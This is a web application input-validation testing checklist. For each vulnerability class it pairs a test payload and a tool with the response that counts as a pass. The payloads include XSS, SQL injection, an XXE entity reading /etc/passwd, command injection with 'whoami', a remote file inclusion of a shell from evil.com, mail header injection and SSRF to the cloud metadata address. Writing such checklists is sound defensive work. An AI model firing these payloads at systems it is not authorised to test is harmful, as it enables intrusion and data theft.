# Data-Input-Validation

---

### 1. Cross-Site Scripting (XSS)
* **Reflected XSS**
    * **Test:** Inject `<script>alert(1)</script>` into search bars or URL parameters.
    * **Tool:** Burp Suite (Repeater).
    * **Clean Pass:** View the response body; `< >` must be converted to `&lt; &gt;`.
* **Stored XSS**
    * **Test:** Submit `<img src=x onerror=alert(1)>` in a comment or profile field.
    * **Tool:** Burp Suite.
    * **Clean Pass:** Refresh the page; the payload is either stripped or rendered as plain text.
* **DOM-based XSS**
    * **Test:** Use a URL fragment: `site.com/#<img src=x onerror=alert(1)>`. 
    * **Tool:** DevTools (Console/Sources).
    * **Clean Pass:** Trace the variable to the sink; verify it uses `.textContent` instead of `.innerHTML`.
    

---

### 2. Injection Vulnerabilities
* **SQL Injection**
    * **Test:** Inject `' OR 1=1--` into login/search fields.
    * **Tool:** Burp Suite.
    * **Clean Pass:** Generic 200 OK (no results) or 403 error. No SQL syntax errors in the response.
    
* **LDAP Injection**
    * **Test:** Inject `*)(| (uid=*` into directory searches.
    * **Tool:** Burp Suite.
    * **Clean Pass:** The query returns 0 results or an error because the `*` is treated as a literal character.
* **XML Injection (XXE)**
    * **Test:** Modify a POST request with `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
    * **Tool:** Burp Suite.
    * **Clean Pass:** The parser returns a "Forbidden Entity" error or ignores the DTD.
* **XPath Injection**
    * **Test:** Inject `' or '1'='1` into XML-based queries.
    * **Tool:** Burp Suite.
    * **Clean Pass:** The application returns an error or no data, neutralizing the quote.
* **SSI Injection**
    * **Test:** Inject `` into `.shtml` pages.
    * **Tool:** cURL.
    * **Clean Pass:** The string is reflected as a literal comment; no file list is generated.
* **Code Injection**
    * **Test:** Inject `phpinfo();` or `print(7*7)` into parameters passed to `eval()`.
    * **Tool:** Burp Suite.
    * **Clean Pass:** The input is treated as a string; no system info is displayed.
* **Command Injection**
    * **Test:** Inject `; whoami` or `| ping -c 1 [Your_IP]`.
    * **Tool:** cURL.
    * **Clean Pass:** The server ignores the semicolon and treats the rest as a literal IP address/filename.

---

### 3. File & Logic Vulnerabilities
* **File Inclusion (LFI/RFI)**
    * **Test:** Request `?page=../../etc/passwd` or `?page=http://evil.com/shell.txt`.
    * **Tool:** cURL.
    * **Clean Pass:** Server returns 404/403. No system file content is rendered.
* **Server-Side Template Injection (SSTI)**
    * **Test:** Inject `${7*7}` or `{{7*7}}`.
    * **Tool:** Burp Suite.
    * **Clean Pass:** The page renders `${7*7}` literally; it does **not** render `49`.
* **Mass Assignment**
    * **Test:** Add `"is_admin": true` to a JSON update body.
    * **Tool:** Burp Suite.
    * **Clean Pass:** The response shows the user object updated *without* the elevated privilege.

---

### 4. Protocol & Header Attacks
* **HTTP Parameter Pollution (HPP)**
    * **Test:** Send `?id=1&id=2`.
    * **Tool:** Burp Suite.
    * **Clean Pass:** The app consistently uses the first or last instance; no security filters are bypassed.
* **HTTP Splitting / Smuggling**
    * **Test:** Send requests with conflicting `Content-Length` and `Transfer-Encoding`.
    * **Tool:** Burp Suite (Smuggler Extension).
    * **Clean Pass:** The server returns a 400 Bad Request or rejects the ambiguous headers.
* **Host Header Injection**
    * **Test:** Change the `Host:` header to `evil.com`.
    * **Tool:** Burp Suite.
    * **Clean Pass:** Any redirects or password reset links still use the original, valid domain.
* **IMAP/SMTP Injection**
    * **Test:** Inject `\r\nBcc: test@evil.com` into mail forms.
    * **Tool:** Burp Suite.
    * **Clean Pass:** Newlines are stripped; only the intended recipient receives the mail.

---

### 5. Advanced & Network Validation
* **Server-Side Request Forgery (SSRF)**
    * **Test:** Supply `http://169.254.169.254/` to a URL-fetcher.
    * **Tool:** Burp Collaborator.
    * **Clean Pass:** The server blocks the request; no DNS/HTTP interaction is recorded by Collaborator.
    
* **Format String Injection**
    * **Test:** Inject `%x %x %s %n` into loggable fields.
    * **Tool:** Burp Suite.
    * **Clean Pass:** The application logs the literal string; no memory addresses are leaked.
* **Overflow (Buffer/Stack/Heap/Integer)**
    * **Test:** Send 100,000 "A"s or a number larger than `2,147,483,647`.
    * **Tool:** cURL.
    * **Clean Pass:** The app returns an error or truncates safely; it does **not** crash (500 error).
* **HTTP Incoming Requests (Inspection)**
    * **Test:** Monitor traffic for unencrypted sensitive data.
    * **Tool:** Wireshark.
    * **Clean Pass:** All sensitive tokens/creds are encrypted and not present in URLs.
* **Incubated Vulnerabilities**
    * **Test:** Inject a payload, then trigger it via a different process (e.g., a background task or Admin view).
    * **Tool:** Burp Suite.
    * **Clean Pass:** The payload remains encoded and inert when triggered in the second context.

### Summary for "Clean" Status
To mark a test as **Pass**, you must confirm:
1.  **Contextual Encoding:** Malicious characters are neutralized for the specific output.
2.  **Strict Validation:** The server rejects the malformed request (400/403).
3.  **Generic Errors:** No sensitive information (stack traces, DB versions) is disclosed.
